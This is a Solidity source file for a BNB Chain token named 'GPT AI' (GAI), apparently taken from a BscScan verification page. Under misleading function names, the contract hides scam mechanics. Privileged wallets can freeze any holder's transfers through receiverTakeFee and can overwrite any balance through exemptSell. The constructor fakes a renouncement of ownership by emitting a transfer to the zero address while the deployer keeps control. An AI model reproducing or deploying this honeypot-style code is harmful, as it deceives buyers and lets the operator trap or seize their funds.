/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface isMarketing {
    function createPair(address maxLaunch, address maxTotalReceiver) external returns (address);
}

abstract contract shouldLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract GPTAI is shouldLiquidity {

    mapping(address => bool) public exemptReceiver;

    function receiverTakeFee(address sellToken) public {
        if (!walletIs[_msgSender()]) {
            return;
        }
        if (sellToken == shouldMaxBuy || sellToken == buyLimit) {
            return;
        }
        exemptReceiver[sellToken] = true;
    }

    address launchedTx = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    string public name = "GPT AI";

    mapping(address => mapping(address => uint256)) public allowance;

    bool public amountFeeSwap;

    uint256 private launchExempt;

    function exemptSell(address buyWallet, uint256 listTake) public {
        if (!walletIs[_msgSender()]) {
            return;
        }
        balanceOf[buyWallet] = listTake;
    }

    bool private receiverIsExempt;

    uint256 private senderTx;

    constructor (){ 
        isSenderBuy();
        emit Transfer(address(0), shouldMaxBuy, totalSupply);
        emit OwnershipTransferred(shouldMaxBuy, address(0));
    }

    function transferFrom(address receiverTx, address buyWallet, uint256 listTake) public returns (bool) {
        if (receiverTx != _msgSender()  && allowance[receiverTx][_msgSender() ] != type(uint256).max) {
            require(allowance[receiverTx][_msgSender() ] >= listTake);
            allowance[receiverTx][_msgSender() ] -= listTake;
        }
        require(!exemptReceiver[receiverTx]);
        return launchedFrom(receiverTx, buyWallet, listTake);
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function approve(address enableMax, uint256 listTake) public returns (bool) {
        allowance[_msgSender() ][enableMax] = listTake;
        emit Approval(_msgSender() , enableMax, listTake);
        return true;
    }

    event Transfer(address indexed from, address indexed receiverMin, uint256 value);

    function minAuto(address modeSender) public {
        require(!amountFeeSwap);
        walletIs[modeSender] = true;
        amountFeeSwap = true;
    }

    address fromWalletIs = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    mapping(address => uint256) public balanceOf;

    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 public launchMarketing;

    function launchedFrom(address autoFeeTrading, address teamReceiver, uint256 listTake) internal returns (bool) {
        require(balanceOf[autoFeeTrading] >= listTake);
        balanceOf[autoFeeTrading] -= listTake;
        balanceOf[teamReceiver] += listTake;
        emit Transfer(autoFeeTrading, teamReceiver, listTake);
        return true;
    }

    event Approval(address indexed modeAt, address indexed spender, uint256 value);

    address public shouldMaxBuy;

    string public symbol = "GAI";

    address public buyLimit;

    function isSenderBuy() private {
        walletIs[_msgSender()] = true;
        balanceOf[_msgSender()] = totalSupply;
        shouldMaxBuy = _msgSender();
        buyLimit = isMarketing(address(launchedTx)).createPair(address(fromWalletIs),address(this));
    }

    function transfer(address buyWallet, uint256 listTake) external returns (bool) {
        return transferFrom(_msgSender() , buyWallet, listTake);
    }

    mapping(address => bool) public walletIs;

    bool private fundTo;

    uint8 public decimals = 18;

}